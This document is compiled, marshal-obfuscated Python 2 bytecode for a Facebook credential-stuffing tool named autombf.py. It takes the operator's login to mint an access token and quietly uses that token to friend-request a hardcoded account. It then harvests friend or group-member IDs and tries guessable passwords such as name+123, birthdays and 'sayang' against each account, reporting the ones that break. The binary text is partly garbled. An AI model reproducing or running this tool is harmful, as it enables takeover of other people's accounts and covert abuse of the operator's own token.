�
�M]c           @   s!   d  d l  Z  e  j d � d Ud S(   i����Ns$  c           @   s!   d  d l  Z  e  j d � d Ud S(   i����Nsq#  c           @   s�  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l m Z y d  d l
 Z
 Wn e k
 r� e  j d � n2 Xy d  d l Z Wn e k
 r� e  j d � n Xd  d l m Z d  d l
 m Z e e � e j d � e
 j �  Z e j e � e j e
 j j �  d d	 �d g e _ d �  Z d
 �  Z d Z d �  Z  d Z! g  Z" g  Z# g  Z$ g  Z% g  Z& d �  Z' d �  Z( d �  Z) e* d k r�e' �  n  d S(   i����N(   t
   ThreadPools   pip2 install mechanizes   pip2 install requests(   t   ConnectionError(   t   Browsert   utf8t   max_timei   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16c           C   s   d GHt  j j �  d  S(   Ns   [1;91m[!] Keluar(   t   ost   syst   exit(    (    (    s   <Ahmad_Riswanto>t   keluar   s    c         C   sC   x< |  d D]0 } t  j j | � t  j j �  t j d � q Wd  S(   Ns   
g�������?(   R   t   stdoutt   writet   flusht   timet   sleep(   t   zt   e(    (    s   <Ahmad_Riswanto>t   jalan   s    
s�   
[31;1m ____ _  _ ___ ____    _  _ ___  ____
 |__| |  |  |  |  |    |\/| |__] |___
 |  | |__|  |  |__|    |  | |__] |
[33;1m--------------------------------------c          C   sF   d d d g }  x0 |  D]( } d | Gt  j j �  t j d � q Wd  S(   Ns   .   s   ..  s   ... s7   
[37;1m[[92m•[37;1m] [32;1mIs being Login [37;1mi   (   R   R	   R   R   R
   (   t   titikt   o(    (    s   <Ahmad_Riswanto>t   tik$   s
    

i    c          C   s�  y t  d d � }  t �  Wn~t t f k
 r�d GHd GHt d � } t d � } t �  y t j  d � Wn  t j k
 r� d GHt	 �  n Xt
 t j _ t j
 d	 d
 � | t j d <| t j d <t j �  t j �  } d
 | k r<y.d | d | d } i d d 6d d 6| d 6d d 6d d 6d d 6d d 6d d 6| d 6d d 6d  d! 6} t j d" � } | j | � | j �  } | j i | d# 6� d$ } t j | d% | �} t j | j � }	 t  d d& � }
 |
 j |	 d' � |
 j �  d( GHt j d) |	 d' � t j d* � t �  Wq<t j j  k
 r8d+ GHt	 �  q<Xn  d, | k rqd- GHt! j" d. � t j d/ � t	 �  q�d0 GHt! j" d. � t j d/ � t# �  n Xd  S(1   Ns	   login.txtt   rs1   
[37;1m[[92m~[37;1m][92m Generate Acces Tokens:   [37;1m[[92m~[37;1m] [92mlogin to your facebook accounts9   [37;1m[[92m•[37;1m] [36;1mUsername [31;1m: [37;1ms9   [37;1m[[92m•[37;1m][36;1m Password [31;1m: [37;1ms   https://m.facebook.coms    
[1;91m[!] Not Found Connectiont   nri    t   emailt   passs   save-devicesG   api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=s`   format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=s;   return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32t    882a8490361da98702bf97a021ddc14dt   api_keyt   passwordt   credentials_typet   JSONt   formatt   1t   generate_machine_idt   generate_session_cookiest   en_USt   locales
   auth.logint   methodt   0t   return_ssl_resourcess   1.0t   vt   md5t   sigs'   https://api.facebook.com/restserver.phpt   paramst   wt   access_tokensC   
[37;1m[[92m•[37;1m] [32;1msuccessfully generate access tokensM   https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=i   s   
[1;91m[!] Tidak ada koneksit
   checkpoints'   
[1;91m[!] [1;93mAkun kena Checkpoints   rm -rf login.txti   s   
[1;91m[!] Login Gagal($   t   opent   supert   KeyErrort   IOErrort	   raw_inputR   t   brt	   mechanizet   URLErrorR   t   Truet   _factoryt   is_htmlt   select_formt   formt   submitt   geturlt   hashlibt   newt   updatet	   hexdigestt   requestst   gett   jsont   loadst   textR
   t   closet   postR   R
   t
   exceptionsR   R   t   systemt   login(   t   tokett   idt   pwdt   urlR(   t   datat   xt   aR   R   t   zedd(    (    s   <Ahmad_Riswanto>RI   3   sd    


S







c           C   s�   t  j d � y t d d � j �  a Wn7 t k
 r_ d GHt  j d � t j d � t �  n Xt  j d � t	 GHd GHd GHd	 GHd
 GHt
 �  d  S(   Nt   resets	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   s,   [0m[[92m1[0m]. CRACK DARI DAFTAR ID TEMANs3   [0m[[92m2[0m]. CRACK DARI DAFTAR ID MEMBER GROUPs*   [0m[[92m3[0m]. [31;1mKELUAR/LOGOUT....s-   [33;1m--------------------------------------(   R   RH   R-   t   readRJ   R0   R   R
   RI   t   logot   pilih_super(    (    (    s   <Ahmad_Riswanto>R.   m   s    




c          C   sH  t  d � }  |  d k r' d GHt �  n�|  d k r� t j d � t GHd GHt j d t � } t j	 | j
 � } x>| d D] } t j | d	 � qz Wn|  d
 k ryt j d � t GHt  d � } y> t j d | d
 t � } t j	 | j
 � } d | d GHWn  t
 k
 r"d GHt j �  n Xt j d | d t � } t j	 | j
 � } x] | d D] } t j | d	 � q[Wn7 |  d k r�t j d � t �  n d |  d GHt �  d t t t � � GHd d d d g } x0 | D]( }	 d |	 Gt j j �  t j d � q�WHd GHd �  }
 t d  � } | j |
 t � d! GHt j �  d  S("   Ns-   [31;1m[[37;1mINPUT[31;1m]=[32;1m>[37;1m t    s   [1;91m[!] Jangan kosongR   RR   s<   [37;1m[[92m•[37;1m] [32;1mSedang Mengumpulkan Id Temans3   https://graph.facebook.com/me/friends?access_token=RN   RK   t   2s:   [37;1m[[92m•[37;1m] [32;1mID Grup   [1;91m:[1;97m s%   https://graph.facebook.com/group/?id=s   &access_token=s:   [37;1m[[92m•[37;1m] [32;1mNama grup [1;91m:[1;97m t   names   [1;91m[!] Grup tidak ditemukans   https://graph.facebook.com/s5   /members?fields=name,id&limit=999999999&access_token=t   3s   rm -rf login.txts   [1;91m[✖] [1;97ms    [1;91mTidak adas:   [37;1m[[92m•[37;1m] [32;1mJumlah ID [1;91m: [31;1ms   .   s   ..  s   ... s   .... s/   

[37;1m[[92m•[37;1m] [32;1mCrack [1;97mi   s-   [33;1m--------------------------------------c         S   s  |  } y�t  j d | d t � } t j | j � } | d d } t j d | d | d � } t j | � } d | k r� d	 | d
 | GHnr| d d } t j d | d | d � } t j | � } d | k r� d	 | d
 | GHn| d d } t j d | d | d � } t j | � } d | k rJd	 | d
 | GHn�| d
 }	 |	 j	 d d � }
 t j d | d |
 d � } t j | � } d | k r�d	 | d
 |
 GHnPd } t j d | d | d � } t j | � } d | k rd	 | d | GHn� d } t j d | d | d � } t j | � } d | k r\d	 | d | GHn� d }
 t j d | d |
 d � } t j | � } d | k r�d	 | d |
 GHnT d } t j d | d | d � } t j | � } d | k rd	 | d | GHn  Wn n Xd  S(   Ns   https://graph.facebook.com/s   /?access_token=t
   first_namet   123s�   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6R+   s.   [1;97m[[1;92mOK✓[1;97m][31;1m ~>[37;1m s   [31;1m ~>[37;1m t   12345t	   last_namet   birthdayt   /RV   t   sayangs    [31;1m~>[37;1m t   doraemons    [31;1m ~>[37;1m t	   anonymoust	   hacker123(
   R@   RA   RJ   RB   RC   RD   t   urllibt   urlopent   loadt   replace(   t   argt   userRP   t   bt   pass1RN   t   qt   pass2t   pass3t   lahirt   pass4t   pass5t   pass6t   pass7t   pass8(    (    s   <Ahmad_Riswanto>t   main�   s^    
i   s   
[1;91m[+] [1;97mSelesai(   R1   RU   R   RH   RT   R@   RA   RJ   RB   RC   RD   RK   t   appendR/   R   R   R   t   strt   lenR	   R   R   R
   R    t   map(   t   peakR   R   t   st   idgt   aswt   ret   iR   R   Ru   t   p(    (    s   <Ahmad_Riswanto>RU   �   sZ    








	8t   __main__(   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16(+   R   R   R   t   datetimet   randomR<   R~   t	   threadingRB   t   getpassRd   t   multiprocessing.poolR    R3   t   ImportErrorRH   R@   t   requests.exceptionsR   R   t   reloadt   setdefaultencodingR2   t   set_handle_robotst   Falset   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR   R   RT   R   t   backt   threadst   berhasilt   cekpointRK   t   emRI   R.   RU   t   __name__(    (    (    s   <Ahmad_Riswanto>t   <module>   s@   �




				:		p(   t   marshalt   loads(    (    (    s   <Ahmad_Riswanto>t   <module>   s   (   t   marshalt   loads(    (    (    s
   autombf.pyt   <module>   s   
